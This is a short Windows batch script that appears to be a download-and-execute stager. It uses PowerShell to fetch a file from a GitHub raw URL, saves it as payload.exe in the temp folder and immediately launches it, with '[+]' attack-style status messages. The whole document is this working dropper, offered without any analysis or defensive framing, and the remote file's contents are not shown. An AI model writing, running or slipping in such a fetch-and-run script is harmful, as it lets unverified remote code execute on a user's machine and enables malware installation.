@echo off
set DOWNLOAD_URL=https://github.com/shy327/testSM/raw/refs/heads/main/testSMC
set TARGET_FILE=%TEMP%\payload.exe

echo [+] Downloading file via PowerShell...
powershell -Command "try { Invoke-WebRequest '%DOWNLOAD_URL%' -OutFile '%TARGET_FILE%' -UseBasicParsing } catch { Write-Host '[-] Download failed: ' $_.Exception.Message }"

if exist "%TARGET_FILE%" (
    echo [+] Running downloaded file...
    start "" "%TARGET_FILE%"
) else (
    echo [-] File was not downloaded successfully.
)

pause
